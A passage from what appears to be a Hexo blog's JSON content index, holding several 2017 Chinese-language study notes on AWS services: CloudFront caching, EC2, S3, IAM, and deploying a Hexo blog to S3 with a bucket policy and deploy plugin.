注意：Cloudfront的配置每次更改都需要从新部署，每次重新部署都需要大约半小时时间，为了避免不必要的时间浪费，最好是一次配置成功，不然真的很痛苦。。 另外，关于Cloudfront的日志，AWS不会针对日志功能进行收费，但用户需要对占用的S3 bucket存储和访问付费，日志内容大概和Nginx的access.log差不多，个人觉得AWS的Reports &amp; Analytics已经做得很好了，日志有些多余，建议可以在学习完后关闭。 关于缓存时间关于S3里的Object在Cloudfront的各节点缓存的时间，默认为24小时，也就是说当我发布一篇新博客，由于主页index.html名字没有变化，只是更新了新版本，我要等到24小时候Edge location中缓存的数据过期才能看到新版本，这对我的小博客来说时间太长了，需要更改这个Cache时间。更改Cache时间有两种方式：一是更改TTL（Time To Live）时间，二是增加Cache-Control: max-age=[seconds]的header，关于第二种方式，具体参见官方文档，这里我说一下如何更改TTL：进入Distribution的管理员界面，选择Behaviors标签，勾选待编辑的Behavior，点选Edit 在Edit Behavior页面Object Caching项目勾选Customize自定义TTL，将Default TTL改为3600（1小时）点选Yes，Edit即可。同样，更新配置要等待半小时左右方能生效。 参见 Specifying How Long Objects Stay in a CloudFront Edge Cache (Expiration) 首页缓存时间更改TTL后，首页的更新也需要一个小时，对大部分情况来说这个时间还是比较长，这个时候可以通过更改S3的Bucket里面的Object的Metadata的方式增加Cache-Control的Header来进一步减少首页的Cache时间。 这个手动的设置会在每次Deploy的时候被覆盖，所以需要给Deploy插件增加Update Metadata/Header的设置。 如何清除缓存配置Route53进入Route53的Console，进入Hosted Zones标签，点选使用的Domain Name。 点选Create Record Set，输入二级域名下的三级域名（可以置空），选择Type为A类地址，选择一个A-record），在AWS的内部资源中选择Cloudfront下对应你博客的域名，Route Policy为默认的Simple即可，点选Save Record Set 只需要数分钟，A-record即可生效。 验证现在可以通过HTTPS访问我在每个Edge Location缓存的博客了： https://www.duyidong.com 经测试，同一个页面在加上Cloudfront之前（在S3 bucket中）访问时间是11秒，使用gitHub.io(带CDN)是6秒，使用Cloudfront之后加载时间大概是2.4秒，可见Cloudfront的加速效果是非常理想的。 参考资料 https://www.huangbowen.net/blog/2013/10/01/migrate-octopress-to-aws-step-2/ https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-policy.html https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"Blog","slug":"Blog","permalink":"https://www.duyidong.com/tags/Blog/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.duyidong.com/tags/HTTPS/"},{"name":"CDN","slug":"CDN","permalink":"https://www.duyidong.com/tags/CDN/"},{"name":"Cloudfront","slug":"Cloudfront","permalink":"https://www.duyidong.com/tags/Cloudfront/"},{"name":"Route53","slug":"Route53","permalink":"https://www.duyidong.com/tags/Route53/"},{"name":"博客上云","slug":"博客上云","permalink":"https://www.duyidong.com/tags/博客上云/"}]},{"title":"AWS虚拟机EC2","date":"2017-03-15T12:02:03.000Z","path":"2017/03/15/AWS-EC2/","text":"Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机服务，用户可以使用EC2服务创建一个个实例(instances)，即虚拟机。 亚马逊的EC2标榜有几大优势：完全控制，灵活使用，方便集成，安全，便宜，简单好用。关于EC2有几个重要的概念：Instance Type，即在选择Instance的时候的内存，CUP等硬件指标；然后是EBS，即挂载硬盘，租户可以选择不同IO，不同介质的虚拟硬盘；其次是AMI，即用于启动虚拟机的操作系统镜像；另外还有Security Group，可以理解为虚拟机的防火墙；其他的服务都属于附加服务，比如负载均衡，弹性伸缩，监控报警，权限控制，类似nfs的弹性存储介质等等。虚拟机服务是云服务最重要的服务，几乎各大云厂商最终要的一项都是对租户提供虚拟机，看大厂的虚拟机策略，其他各厂基本可通晓一二。由于企业级应用很少用windows的使用场景，笔者将主要关注在Linux的使用上，本文对windows使用场景改不涉及。 InstancesEC2为亚马逊的服务，Instance就是该服务提供的一个实例 —— 虚拟机 Instance Purchasing Options在说Instance Type之前，有个更重要的东西：Instance的收费方式（Instance Purchasing Options）。Instance有四种收费方式，针对不同应用场景要学会选择适合的Purchasing Option: On-Demand Instance 按小时收费，也是默认的收费方式，不足一小时按一小时计费；属于比较灵活的按需付费方式 Reserved Instances 预留实例，可选1-3年，一次付费，完成付费之后不管是否使用都会收费，价格相对按小时计费要便宜些，企业作为服务器长期使用通常会选择使用的付费方式 Scheduled Reserved Instances 计划预留实例，为期一年，在计划时间内可用。值得注意的是，只有几个高性能的Instance Type支持该购买方式，且每年使用不得少于1200小时，需提前三个月购买 Spot Instances 竞价实例，价格随时间浮动，租户在申请时出价，当租户出价高于该时间点竞价实例价格时，租户获得该实例使用权，当价格再次浮动导致实例价格高于租户出价，亚马逊会提前十分钟提醒租户，而后terminate实例，转移到别的地方。注意，被亚马逊销毁的实例最后一小时不收费，而用户在使用期间自行销毁的实例，不足一小时仍以一小时计费。这种收费方式适用于不需长期提供稳定服务的应用场景，比如大数据流处理。 Dedicated hosts买下一个跑在固定物理设备上的Instance的使用权，保证租户的licenses不会因为不同物理设备过期。 Dedicated Instances按小时计费的Dedicated hosts Instances TypeInstance Type有10种类型，用于区分大致的应用场景，每个类型下有从nano, micro, small, medium, large, xlarge到16xlarge数目不等的型号，主要区分CPU数量，vCPU(亚马逊创造的用于衡量单个CPU运算能力的一个参数)，内存，不同，大小、类型不同，直接影响价格。 D2 - Dense storage Instance，特点是硬盘价格平衡，支持HDD硬盘，支持EC2 Enhanced Networking，适用于对存储需求比较高的场景，比如数据库，大数据存储 R4: 特点是内存大 M4: 各项平衡的一个Instance类型，也是默认情况下首选的Instance Type C4 - Compute Optimized: 计算能力优化，特点自然是计算速度快 G2: 包含GPU的Instance，适合于图形计算，视频转码等场景 I3 - High I/O Instance，高硬盘IO，使用固态硬盘，适用于非关系型数据库，大数据处理等 F1 - 可以为程序定制硬件加速 T2: 最常见的Instance使用类型，因为它最便宜，性能也最平衡，生产环境只适用于做web服务器，或小型数据库 P2: 通用GPU计算机，常用于人工智能等需要大量计算的领域 X1: CPU，内存都相当大，针对大规模，企业级，内存应用程序进行了优化，并且在Amazon EC2实例类型中具有每GiB最低的RAM价格 Instance类型在创建后可以被更改，前提是Stop Instance Instance LifeCycleInstance的生命周期，有pending, running, stop ,terminate几个主要的状态和动作，详见下图： MetaData &amp; UserDataUserData是创建完成Instance最后一步用来准备Instance环境的Bash脚本，而MetaData是Instance与生俱来的元数据，通过curl https://169.254.169.254/latest/meta-data/这种奇特的方式获得，包含Instance类型，IP，public-key等信息。值得一提的是IAM的Role之所以在Instance的文件系统中不会出现Credential key的文件，是因为它把Credential key放到了MetaData中，可以通过获取MetaData的方式获得。 EBS简单来讲，EBS(Elastic Block Storage)就是AWS为租户提供的虚拟硬盘，Instance可以看做主板，EBS可以被关联到任何一个Instance上，启动Instance时也必须要一个启动硬盘作为系统盘才能启动。这里就要区分一个重要的概念，EBS 和 Instance Store，两种类型的Instance，应该说EBS Instance比Instance Store 更健全一些，支持更多的Instance Type，生命周期完整；而Instance Store，是由存放在S3的文件系统启动的，启动速度慢，生命周期不完整，只能被Reboot或者Terminate，不能Stop，一旦启动失败就会丢失所有数据，且支持类型有限，被称为短暂存储（ephemeral Storage）下面重点区分一下EBS Volum Type，与Instance相同，重点也在使用场景和节省开销： SSD, General Purporse - gp2: 兼顾性能与价格，吞吐量160MB/s，最大IOPS为10,000; 挂载卷大小在1GB-16TB；使用场景：推荐使用在大部分场景，虚拟机启动磁盘，提供低延迟的服务，可在开发测试环境应用 SSD, Provisioned IOPS - io1: 高性能磁盘，吞吐量320MB/s，IOPS在10,000-20,000; 挂载卷大小在4GB-16TB；使用场景：执行紧急任务的应用模块，大数据库，比如MongDB, Orale, SQL Server等 HDD, Throughput Optimized HDD - st1: 价格相对便宜的机械硬盘，用于存放不常使用的数据，IOPS最大仅500，吞吐量可达500MB/s，磁盘大小为500GB-16TB；使用场景：需要高吞吐量量有需要控制预算的场景，比如大数据，日志存放；不能用作启动磁盘 HDD, Code HDD - sc1: 比普通机械硬盘更便宜的磁盘，IOPS仅为250，吞吐量250MB/s，容量500GB-16TB，使用场景：非常强调便宜的不常访问数据的存储 HDD, EBS Magnetic - standard: 磁带存储，非常便宜的低频次访问的磁盘，性能最次（40-200IOPS, 40-60MB/s吞吐） 注：以上参数均需在Instance类型的支持才能发挥到最大值，机械硬盘的优势在于高吞吐，固态硬盘的好处在于高IO；另外一个需要注意的是，你可以在一个Instance上绑定多个EBS，但是不能将一个EBS绑定在多个Instance上（这种情况要使用EFS） Security GroupSecurity Group可以理解为Instance的防火墙，在Instance的网络中大概处在以下位置： SG的安全策略大范围分为Inbound和Outbound，顾名思义为控制进出，SG刚被创建时默认所有Inbound都是被禁止的，所有Outbound都是被允许的。SG由数条规则（rules）构成，Rules有几个重要参数：目标地址（网段），协议类型，端口号。关于SG有以下几个值得注意的点： SG策略在修改后立即生效 一个SG可以被绑定到任意数量的Instance上 一个Instance可以有多个SG，且被允许的Rules为多个SG的合 SG是有状态的，也就是说当租户允许了一个请求进入，默认会打开到目的地址的返回请求 通常情况我们不适用SG的Rules来组织IP访问，组织IP访问应该用ACL(Access Control List) SG只能添加允许访问的策略，不能添加禁止访问的策略 Volumse &amp; Snapshots关于Volume Type，已经在EBS部分提到了，这里主要想讲的是磁盘的生命周期。Volume可以从EBS创建，Attache到一个Instance上，再在操作系统中进行挂载，使其成为一个可用的文件系统，Volume可以随时扩容，但扩容后需要更新文件系统。Volume可以凭空创建，也可以使用Snapshot创建，Snapshot就是磁盘的一个镜像，存放于S3中，用于定期备份磁盘。Snapshot是增量式的，也就是说只有被更改的部分会被记录在S3中。第一个Snapshot的创建会比较花时间。Snapshot可以通过S3在账户之间共享。可以开启自动备份定时备份Volume。EBS可以被加密，除了root Volume，租户可以使用第三方工具对启动磁盘进行加密。另外说一下关于Windows卷扩容，需要停止磁盘读写，有以下措施可以做到： 冻结文件系统 卸载磁盘驱动（Unmount the RAID Array） 关闭关联的EC2 Instance 注：一个EBS可以被创建10,000个Snapshot，一个账户可以拥有的Volume存储大小总量单个类型不得超过20TB AMI既然有了Snapshot，另一个重要的概念就不得不提了，AMI，Amazon Machine Image，可以理解为虚拟机的启动镜像。一个AMI包含了在云上启动一个实例所需的所有信息，包括： 一个Root Volume的模板（比如一个操作系统，一个应用） 启动许可（在启动时用于判断该用户是否有从该AMI启动实例的权限） 启动实例时需要挂载的磁盘映射表 一个AMI的生命周期看起来像是这个样子的： AMI是划分Region的，租户可以通过Console或CLI在Region之间拷贝AMI。AMI可以用于在AWS Marketplace出售。 AMI依赖于Snapshot缺不被Instance依赖，这意味着租户不能删除一个被注册的AMI的Snapshot，却可以删除一个运行中实例的AMI，Snapshot，AMI，Instance的关系如下图: ELB &amp; Health ChecksELB，Elastic LoadBalancer是构建一个高可用可用不得不谈的服务，经常和Autoscaling Group一起实现负载伸缩和高可用。ELB是AWS提供的负载均衡器，用于将外部访问请求分发给状态健康的EC2 Instance。ELB在创建的时候会有对外会有一个DNS解析域名，对所属Instance会做健康检查，所谓健康检查就是去定期访问一个文件，判断返回状态码为200即表明这个服务正常，Instance可以动态地被加载到ELB下，也可以动态移除，ELB会自动判断这个Instance已经失去连接并停止发送请求到这个Instance。值得一提的是，ELB一个重要的功能是增加服务容灾性，通常会挂载多个不同AZ的Instance，做到一个数据中心挂掉仍然能够正常提供服务。 Cloud Watch EC2CloudWatch是AWS提供的EC2监控报警的服务，简单好用。作为一款与AWS各种资源高度集成且简单好用的监控工具，CloudWatch有以下功能： 构建Dashboard用于可视化云环境资源状况 警告：配合SNS在某项指标超出一定阈值时发出邮件或短信通知 事件：监控事件用于动态变更云设施 日志：日志保存在S3中 CloudWatch的一些类目默认情况是免费的，免费版本是5分钟取回一次数据，收费后变成1分钟一次，且部分metrics需要收费才能监控。默认监控的内容包括CPU，网络，硬盘IO等，但是没有内存。 Autoscaling Group一个Autoscaling Group包含多个特性相同的Instance，可以根据Instance的负载自动扩容或缩减，同时可以对Instance开启健康检查，如果一个Instance服务异常，Group会依照Lunch Configuration重新启动一个实例替换掉旧的实例。这种方式保证了Group内的Instance总是健康的，且Instance数目会根据负载情况进行动态伸缩。 Placement GroupPlacement Group是一个在同AZ中的一组Instance，同PG的Instance可以享受到高带宽，低延迟的好处，但同时也有如下限制： 一个Placement Group不能跨多个AZ 一个Placement Group的名字必须在一个账号中是独一无二的 Placement Group只支持一部分类型的Instance AWS推荐在一个PG中使用同质的Instance PG不能被合并 租户不能移动一个已经存在的Instance到一个PG中，可以对这个Instance创建AMI，再使用这个AMI在PG中启动一个Instance EFSEFS是AWS提供可以再Instance之间贡献的一个NFS server，其最大的优点是不需要预先设置大小，其空间大小会随文件写入增多逐步扩容至PB级别，而租户只需按使用收费。EFS可以支持上千个NFS4连接，适用于大数据存储，Web服务器静态文件共享，等诸多应用场景。AWS目前有4个Region支持EFS，EFS的文件存放在多个AZ中，可以跨AZ共享文件。 Tips 每个账户默认被限制可以申请20个保留实例，增加上限需要给亚马逊提Request 使用EC2发送邮件数量是有限制的 每个账户最多可申请5个Elastic IP 不同账户标记的一个AZ名字（比如us-east-1a）可能指向不同的物理数据中心 要使用增强网络型实例（Enhanced Network）租户不需要另外付费，只需要选择适当的AMI和适当的Instance类型在一个VPC中即可 默认情况下，当租户停止监控EC2实例或销毁了实例，两周内仍可访问CloudWatch的数据 如果删掉一个Auto Scaling Group，其中的Instance会先被销毁 租户可使用VM Import/Export从EC2导入/导出虚拟机镜像 虽然Snapshot被存在S3中，但租户不能通过S3的API访问到Snapshot，而只能通过EC2的API访问 分享Snapshot给特定的账户，Snapshot的状态仍为“private”","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"云计算","slug":"云计算","permalink":"https://www.duyidong.com/tags/云计算/"},{"name":"EC2","slug":"EC2","permalink":"https://www.duyidong.com/tags/EC2/"}]},{"title":"AWS对象存储服务S3","date":"2017-03-13T01:45:12.000Z","path":"2017/03/13/AWS-S3/","text":"AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。 简单来说S3提供了一些bucket，租户可以在其中存放一些对象，何为对象？所有静态文件都属于镜像。关于S3的高持久和高可用： S3有几个重要的特点 Sunolicity:简单，S3服务可以使用AWS console控制，可以使用命令行，可以通过各种语言的sdk与各应用深度集成。 Drability:数据持久，S3(除了冗余备份服务)可以提供高达11个9的数据持久性，且提供跨Region备份，版本管理，充分保证数据持久性和容灾性（数据丢失可通过版本管理即使回滚）。 Scalability:可扩展性，S3对租户的文件存储总量不做限制，租户可以存放需求相当的任何数量级的对象在S3上。 Security:安全，AWS S3的文件传输都经过SSL加密，租户可以通过设置IAM管理对象访问权限，租户也可以选择在本地加密后上传S3，使用前再选择解密文件。 Available:可用性，S3的Standard提供可用性达到99.99%的服务，IA(Infrequent Access)达到99.9%，RRS(Reduced Redundancy Storage)达到99.99%。 Low Cost:低花费，这一点除了体现在S3按需收费上，还体现在S3的生存周期管理上，S3可以定期将久不访问的数据转移到IA服务上，在定期归档备份至Glacier中。 Broad integration with other AWS services:与AWS其他服务广泛集成，包括安全（IAM, KMS），报警（CLoudWatch, CloudTrail &amp; Event Notifications），计算（Lambda），数据库（EMR, Redshift）。 Enterprise-class Storage Management:企业级存储管理，S3允许租户采用数据驱动的方式提高存储优化，数据安全性和管理效率。 S3的使用场景内容存储及分发S3可以用以上传/下载文件，包括音频视频文件，比如构建一个提供给用户分享视频的网站，S3可以提供无限伸缩的空间，以及跨Region的备份，和定期的存储转移，充分保证网站可用性和高负载能力，另外还提供上传下载加密，以及访问请权限控制的功能。 数据分析存储S3可以用于存储用于数据分析的原始数据，因其很容易和EC2，Lambda等AWS的计算资源或事件触发器集成，可以轻松使用S3构建数据驱动的Data Pipeline，用于数据分析。且S3也可以用于存放数据分析产生的报告。 备份，存档以及灾难恢复因为S3的版本管理和跨Region备份特特性，S3很适合作为备份，且可以定期将数据转归档存储到Glacier中，且易于恢复。 静态网站部署利用S3的高持久和4个9的可用性，可以将自己的静态网站部署到S3上，有以下几个好处： 不用担心激增的访问量，S3可以处理激增的访问量，而不用改变网站架构 S3是全球的，意味着你的网站可以在瞬间被部署到全球任意一个或多个节点 S3是按使用付费的 S3的功能及特性S3有很多功能特性用于构建服务，这些服务都往往相互依存，了解服务功能固然重要，但结合使用场景才能凸显其价值。参照：https://aws.amazon.com/s3/details/和https://www.amazonaws.cn/en/s3/details/ 属性Version开启版本控制后，对于bucket里每一个object的操作都会在版本中被记录，租户可以在console中下载历史版本，回滚，删除版本。值得一提的是，在跨Region备份功能开启时，主Bucket的版本删除并不会影响到备份bucket的版本。 Logging该功能可以指定一个bucket和一个路径用于存放租户对于S3使用的所有日志，包括该bucket内的存取更新对象的操作。 Staic website hosting开启此功能可以将一个bucket变成一个静态网站，只需要制定入口index.html和错误页面即可。当然还有一个前提是设置对象权限为所有人外部可访问。 Tags给Bucket资源打上一个或多个标签，方便管理。 Cross-region replication制定一个另一个Region的Bucket作为备份，需要Version功能开启。 Transfer Acceleration加速上传功能，类似于CloudFront，通过缓存在Globle Infrastructure的节点加速上传。 Events开启这个功能，当S3的bucket或object发生动作时，可以触发SNS topic或SQS队列，或者Lambda Function。 授权Access Control List大概就是IAM的某一个用户，可以对对象/权限控制执行如何操作（读/写），值得注意的是，默认情况下一个bucket创建出来后它的全显是只有它的创建者可以读/写这个bucket，粒度较大，适用于整个bucket的权控制。 Bucket Policy更细粒度的权限控制方案，以资源标识符为单位，与IAM相对应，可用于指定某个用户可以对bucket内部的哪些资源做何种操作。 Cross-Origin Resource Sharing (CORS)允许外链请求，在网站中使用API调用S3的资源的时候必须将调用url添加到该项信任中。 管理Lifecycle生存周期主要针对一个文件被上传到S3中，一段时间后访问会减少，再过一段时间可能根本不会被访问而只需要备份的应用场景，可以设置Standard S3 -&gt; IA S3 -&gt; Glacier 的转移顺序，主要价值是减小开支。关于Lifecycle还有一个重要的表格： Analytics可以按标签过滤bucket中的object，生成csv报告，并手动将过滤出来的object转存到另一个同Region的bucket内。 Metrics分为Storage metrics，Request metrics，Data transfer metrics，跟Cloudwatch结合，从多个维度度量租户的S3使用情况。 InventoryS3的一个对象分拣服务，通过Inventory的方式定期将对象分类。 限制 一个对象最大不能超过5TB。 一个账号最多可创建100个bucket。 S3普通上传模式最大只支持5GB以下的文件大小，开启multipart uploadingenable多进程上传和断点续传，从而提高上传效率，在带宽充足且有大文件需要上传的时候可以开启这个功能。 参考资料 AWS S3 FAQhttps://aws.amazon.com/s3/faqs/ AWS S3 Detailhttps://aws.amazon.com/s3/details/ AWS S3 Use Casehttps://docs.aws.amazon.com/AmazonS3/latest/gsg/S3-gsg-CommonUseScenarios.html https://www.amazonaws.cn/en/s3/ Uploading Objecthttps://docs.aws.amazon.com/AmazonS3/latest/dev/UploadingObjects.html","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"S3","slug":"S3","permalink":"https://www.duyidong.com/tags/S3/"},{"name":"对象存储服务","slug":"对象存储服务","permalink":"https://www.duyidong.com/tags/对象存储服务/"}]},{"title":"将Hexo博客发布到S3","date":"2017-03-07T09:42:34.000Z","path":"2017/03/07/Deploy-Hexo-to-S3/","text":"最近在学习AWS服务，加之两次遇到github.io无法访问的情况，决定将博客迁移到AWS S3上。 S3介绍S3是AWS一个对象存储服务，拥有11个9的耐久度和3个9的可用性（并不算高），属于AWS底层存储服务。同时提供Host静态网站的功能 第一步：创建一个Bucket 进入S3界面，点击CreateBucket，取名为www.duyidong.com 选择一个Region，你可以在这里找到延迟最低的Region用于存放你的博客 设置Policy，确保外部可访问： { &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Sid&quot;: &quot;PublicReadForGetBucketObjects&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Principal&quot;: &quot;*&quot;, &quot;Action&quot;: &quot;s3:GetObject&quot;, &quot;Resource&quot;: &quot;arn:aws:s3:::www.duyidong.com/*&quot; } ] } 注： arn:aws:s3:::www.duyidong.com/*为bucket里对象的资源标识符 在Properties下开启Static website hosting，设置入口文件为index.html，404页面为404/index.html 第二步：创建一个用于上传静态文件的用户使用Policy Generator创建一个Policy这里需要一个只有对www.duyidong.com这个bucket有上传权限的用户，首先要创建Policy，这里要用到Policy Generator。 进入IAM -&gt; Policies -&gt; Create Policy -&gt; Policy Generator 选择S3的PutObject Action, ARN为目标Bucket的ARN，届时会生成如下Policy: 注：经笔者反复试错，再参照官方文档，最终确定User Policy需要以下权限： { &quot;Version&quot;:&quot;2012-10-17&quot;, &quot;Statement&quot;:[ { &quot;Effect&quot;:&quot;Allow&quot;, &quot;Action&quot;:[ &quot;s3:ListBucket&quot;, &quot;s3:GetBucketLocation&quot; ], &quot;Resource&quot;:&quot;arn:aws:s3:::www.duyidong.com&quot; }, { &quot;Effect&quot;:&quot;Allow&quot;, &quot;Action&quot;:[ &quot;s3:PutObject&quot;, &quot;s3:GetObject&quot;, &quot;s3:DeleteObject&quot; ], &quot;Resource&quot;:&quot;arn:aws:s3:::www.duyidong.com/*&quot; } ] } 创建用户组Groups -&gt; Create New Group -&gt; 将上一步创建的Policy attach到该UserGroup上，用户组创建完成。 创建用户Users -&gt; Add User，勾选Programmatic access，输入用户名，将用户加入到上一步创建的用户组中，将用户的Access key下载到本地。 第三步：安装插件，上传静态文件 运行命令 npm install --save hexo-deployer-s3 编辑_config.yml: deploy: type: s3 bucket: &lt;AWS bucket name&gt; aws_key: &lt;AWS id key&gt; aws_secret: &lt;AWS secret key&gt; region: &lt;AWS bucket region&gt; 由于我会把博客源码放到Github上，Access key不能写在配置文件里，而采用环境变量的方式，在~/.bashrc中加入： export AWS_ACCESS_KEY-ID=&lt;access key&gt; export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt; 再执行 source ~/.bashrc 届时将可以成功将博客发布到S3上，执行： hexo d 其他对比了一下Github和S3的速度，最大的一个页面github.io大概需要6-9秒，而S3要11秒左右，虽然github的速度不太稳定，但毕竟要比S3快，所以暂不把DNS指向S3，待日后开启CloudFront服务后再做决定。另外，hexo是支持多路径发布的，形如： deploy: - type: git repo: - type: heroku repo: 后续要使用自己的域名，开启HTTPS，使用AWS的CND，参照：使用AWS解锁HTTPS和CDN 参考资料: https://hexo.io/docs/deployment.html https://inject.coffee/hexo-travis-s3-part-2-deploying-to-aws/ https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html https://aws.amazon.com/s3/storage-classes/ https://aws.amazon.com/s3/reduced-redundancy/","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"S3","slug":"S3","permalink":"https://www.duyidong.com/tags/S3/"},{"name":"Blog","slug":"Blog","permalink":"https://www.duyidong.com/tags/Blog/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.duyidong.com/tags/Hexo/"}]},{"title":"AWS认证与权限管理IAM","date":"2017-03-06T12:41:50.000Z","path":"2017/03/06/浅谈AWS-IAM/","text":"IAM，全称Identity &amp; Access Management，作用是AWS资源的权限管理。 IAM解决了什么问题解决了什么问题，等同于带来了什么价值，在AWS的官方文档中，IAM主要是出于以下需求被设计出来的： 增强安全：AWS给每个用户单独的验证，保证每个用户能够被分配恰当的权限，从而保证AWS资源的安全。默认情况下，IAM的User在被创建的时候是没有任何权限的，所以IAM是默认安全的。 粒度控制：IAM让租户可以进行细粒度的权限控制，比如terminate instance的权限，比如对S3 bucket中对象的只读权限。 临时证书：IAM允许创造生命周期短于用户的权限（Role），Role被绑定在AWS资源（如EC2 instance）上，确保资源之间的相互调用有适当的权限。 灵活的安全证书管理：IAM提供了多种验证方式，包括key pair， 用户名密码，X.509 certificates， MFA，用于Console，CLI，sdk等API调用。 外部身份系统：IAM使AWS支持第三方登录或与企业现有权限管理系统集成，比如微软的Active Directory，或第三方验证，比如Google，Facebook。 与AWS服务无缝贴合：IAM与AWS的几乎所有服务集成，首先你需要IAM的权限再能访问和使用AWS的服务，其次AWS中的服务需要IAM的权限才能完成对AWS其他资源的调用。 几个概念AWS的官方文档和很多博客都在说的Get Start，最重要的就是AWS中的几个名词： User：一个User对应一个AWS用户，这个用户指的是一个真实的用户，用户在创建初期是没有任何权限的，需要被加到用户组或绑定Policy才能有相应权限，User有两种验证方式，一种是key pair，常用于集成到程序中和AWS CLI 使用，另一种是Username+Password的方式，这种方式只能用于Console登录。 UserGroup：类比Linux系统的UserGroup，一个UserGroup可以包含多个User，这些User具有UserGroup指定的所有权限，UserGroup的权限由Policy制定，Group不能嵌套Group，一个用户如在多个UserGroup中，权限取Group权限的和。 Policy：由“资源类型”和“操作类型”两个重要参数构成的Json文件，用于定义一定粒度的权限，支持模糊匹配（*），分为官方定义和自己定义，用于定义用户可对何种资源执行何种操作，Policy可以与User，UserGroup，Role绑定。 Role：IAM定义用于代替User赋予资源权限的权限单位，比如给一个EC2 instance S3 administrator的权限，便可以在改Instance上执行aws s3的所有命令，且在本地不会出现Creadentical文件（比User安全）。与User相同，Role 的权限也由Polic组成，由用户定义。另外，Role还可以用于赋予外部账号权限。 官方推荐最佳实践参照官方文档：https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html 禁用AWS Root账户：因为Root用户权限实在太大，要尽可能避免Root账户认证被泄露的风险，建议不要给Root账户创建Access Key，另外开启MFA验证。 为每个用户创建单独的User 尽可能使用Policies 添加权限 使用UserGroup对用户权限进行分组管理 最小权限原则 开启强密码限制 开启MFA设备验证 为EC2 instance上的应用程序创建Role 使用Role而不是User的Credentials 经常更新Credentials 移除不再使用的Creadentials 使用策略提高额外的安全性：比如限制该资源只能从哪个网段访问，只能在某个时间段访问，强制开启MFA验证后才可访问，等等 监控账户活动情况：CloudFront, CloudTrail, CloudWatch, Config, S3 log都可以保证账户活动被监控 限制https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-limits.html大部分限制大部分情况下都碰不到，列几个常见的： 每个User最多可被加入到10个UserGroup 每个User最多可以有2个Access key(包括root account) 一个用户只能验证一个MFA设备 User Policy的长度限制为2KB Role Policy的长度限制为10KB UserGroup Policy的长度限制为5KB 几个知识点以下知识点是笔者在查阅 FAQs 时记录的： 一个EC2 instance不能有多个Role，但一个Role可以被多个EC2 instance共用 Role可以被attach 到一个正在运行的实例 可以将Role与Auto Scaing Group关联，这样每个在该安全组内被启动的实例都会被附上该Role所指的权限 AWS有一个用于测试你的Polic的工具：Policy Simulator IAM的每一个记录都会被CloudTrail记录log，保存在S3中","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"亚马逊认证与权限","slug":"亚马逊认证与权限","permalink":"https://www.duyidong.com/tags/亚马逊认证与权限/"},{"name":"Security","slug":"Security","permalink":"https://www.duyidong.com/tags/Security/"},{"name":"IAM","slug":"IAM","permalink":"https://www.duyidong.com/tags/IAM/"}]},{"title":"Amazon Web Server 服务概览","date":"2017-02-28T06:55:01.000Z","path":"2017/02/28/AWS-Services-Overview/","text":"最近在准备AWS助理级架构师认证考试，借此机会梳理一下AWS比较核心的几个服务，不会太深入细节，只做简单阐释。 首先关于AWS服务一览： 以下服务会出现在助理级架构师考试中： 下面就按照这个顺序过一下AWS的众多服务。 AWS Global InfrastructureAWS拥有全球化的基础设施让你的服务可以在瞬间扩展到全球，你可以在这里查看亚马逊当前拥有的全球基础设施信息。截止到今天（2017.02.28）AWS Cloud在全球共有42个Availablity Zone和16个geographic Regions，中国区有2个Region分别在北京和宁夏（宁夏区暂未开放），每个Region各有两个AZ，受政策限制，AWS中国区与其他各地区服务分离，由光环新网代理，需要单独申请账号。 Region &amp; Availablity ZoneRegion是AWS按物理地理划分的节点，每个Region包含两个或以上AZ，AZ可以理解为同在一个Region的多个数据中心。之所以一个Region要有至少两个Region是因为AWS很多服务都推荐跨AZ备份而做到高可用。另外AZ之间网络通信延迟远大于Region之前通信，原因也很好理解，Region的物理距离很远，而同Region的AZ是在同一个城市。 Edge LocationEdge Location是比亚马逊数据中心覆盖面还广的服务，我们访问AWS console就使用过Edge Location，同时Edge Location还作为AWS Cloudfront（CDN）服务的节点，你可以在这里看到AWS服务在全球分布的情况，在这里查看AWS的Edge Location分部情况。 Networking &amp; Content Deivery这一部分的内容主要包含网络和CDN。 VPCVPC(Virtual Private Cloud)，AWS服务中关于网络最重要的一个服务，作用是在AWS中虚拟一个定制化局域网，从而可以像管理一个虚拟数据中心一样管理AWS中的资源。一个Region最多可以有5个VPC，你可以自由定义VPC的局域网网段（当然要使用专用网段），每个VPC之间可以单点连通前提是专用网段不重复。VPC就是一个虚拟的局域网，可以通过给VPC绑定InternetGateway的方式让VPC成为public VPC，即在外网可以访问VPC内的服务。就好比公司网络中加了一个从内网出去的路由。当然要让外网的设备找到VPC中的资源还需要给VPC中的资源绑定一个公网IP。 Route53Route53是AWS的DNS服务。可以注册DNS，配置A地址和CNAME。 Cloud FrontCloud Front是亚马逊的CDN（Content Delivery Network）服务，用于缓存下载或上传的数据。 Direct ConnectDirect Connect是亚马逊的网络直连服务，就是用一跟又粗又长的网线，从你的数据中心翻山越岭地连接到AWS的数据中心从而建立一个稳定可靠高效的私有连接。 ComputeAWS Compute包含了亚马逊最重要的服务——计算服务 EC2EC2(Elastic Compute Cloud)可以理解为AWS的虚拟机，包含存储（EBS），镜像（AMI），备份（snapshot），防火墙（Security 